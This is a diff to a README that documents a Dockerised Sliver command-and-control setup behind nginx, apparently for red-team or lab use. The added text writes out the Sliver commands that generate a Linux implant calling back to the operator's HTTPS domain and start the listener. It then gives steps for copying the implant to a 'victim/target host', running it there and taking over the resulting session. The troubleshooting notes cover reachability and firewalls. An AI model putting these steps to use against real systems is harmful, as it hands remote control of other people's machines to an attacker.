@@ -123,27 +123,60 @@ Inside the container:
 
 ### 7. Generate an Implant
 
-In the Sliver console, generate a Linux implant using your configured domain:
+In the Sliver console, generate a Linux implant. **Note**: You must use your actual domain/IP address - environment variables don't work in the Sliver console.
+
+Replace `your-domain-or-ip.com` with your actual domain or IP from your `.env` file:
 
 ```bash
-generate --http ${SLIVER_C2_URL} --os linux --arch amd64 --save /home/sliver/builds
+generate --http https://your-domain-or-ip.com:443/api/current/ --os linux --arch amd64 --save /home/sliver/builds
 ```
 
-Or manually specify the URL (replace with your domain from `.env`):
-
+**Example** (if your DOMAIN is `example.com`):
 ```bash
-generate --http https://your-domain:443/api/current/ --os linux --arch amd64 --save /home/sliver/builds
+generate --http https://example.com:443/api/current/ --os linux --arch amd64 --save /home/sliver/builds
 ```
 
-**Note**: The `${SLIVER_C2_URL}` environment variable is automatically constructed from your `.env` file. You can also manually construct it as `https://${DOMAIN}:443${SLIVER_C2_PATH}`.
+The implant will be saved to `/home/sliver/builds` inside the container, which is mounted to `./builds` on your host.
 
 ### 8. Start HTTP Listener
 
-Start the HTTP listener on the configured port (default: 8080, mapped through nginx):
+Start the HTTP listener. **Note**: Use the actual port number (default: 8080) - environment variables don't work in the Sliver console:
 
 ```bash
-http --lport ${SLIVER_HTTP_PORT:-8080} --lhost 0.0.0.0
+http --lport 8080 --lhost 0.0.0.0
 ```
+
+**Note**: The port number (8080) should match `SLIVER_HTTP_PORT` from your `.env` file (default is 8080).
+
+### 9. Deploy and Execute the Implant
+
+After generating the implant, you need to:
+
+1. **Copy the implant to your victim/target host**:
+   ```bash
+   # From your host machine
+   scp builds/your_implant_name target_host:/tmp/
+   # Or use any other method (HTTP server, USB, etc.)
+   ```
+
+2. **Execute the implant on the target host**:
+   ```bash
+   # On the target host
+   chmod +x /tmp/your_implant_name
+   /tmp/your_implant_name
+   ```
+
+3. **Check for active sessions** in the Sliver console:
+   ```bash
+   sessions
+   ```
+
+4. **Interact with a session**:
+   ```bash
+   use <session-id>
+   ```
+
+**Important**: The implant must be executed on the target host for it to establish a connection back to your Sliver C2 server. The implant will attempt to connect to the URL you specified during generation.
 
 ## Usage
 
@@ -200,7 +233,6 @@ The project uses environment variables for universal configuration. All configur
 - **SSL_KEY_NAME**: SSL private key filename (defaults to `${DOMAIN}.key`)
 - **SLIVER_HTTP_PORT**: Internal Sliver HTTP listener port (default: 8080)
 - **SLIVER_C2_PATH**: C2 endpoint path (default: `/api/current/`)
-- **SLIVER_C2_URL**: Full C2 URL for implant generation (auto-constructed)
 - **NGINX_HTTP_PORT**: External HTTP port (default: 80)
 - **NGINX_HTTPS_PORT**: External HTTPS port (default: 443)
 - **NETWORK_NAME**: Docker network name (default: `demo_net`)
@@ -264,11 +296,14 @@ All services use the `.env` file for configuration. The nginx service uses an en
 
 ### Implant Not Connecting
 
-- Verify the URL in the `generate` command matches your `DOMAIN` from `.env`
+- Verify the URL in the `generate` command matches your actual `DOMAIN` (use the actual value, not `${DOMAIN}`)
 - Check that the `SLIVER_C2_PATH` matches the nginx routing configuration
 - Verify nginx is routing the C2 path correctly (check nginx logs)
-- Ensure the HTTP listener is active in Sliver
-- Confirm the listener port matches `SLIVER_HTTP_PORT` from `.env`
+- Ensure the HTTP listener is active in Sliver (`http --lport 8080 --lhost 0.0.0.0`)
+- Confirm the listener port matches `SLIVER_HTTP_PORT` from your `.env` file (default: 8080)
+- Ensure the implant has been executed on the target host
+- Check firewall rules on both the C2 server and target host
+- Verify the implant can reach your C2 server's IP/domain on port 443
 
 ### Port Conflicts
 
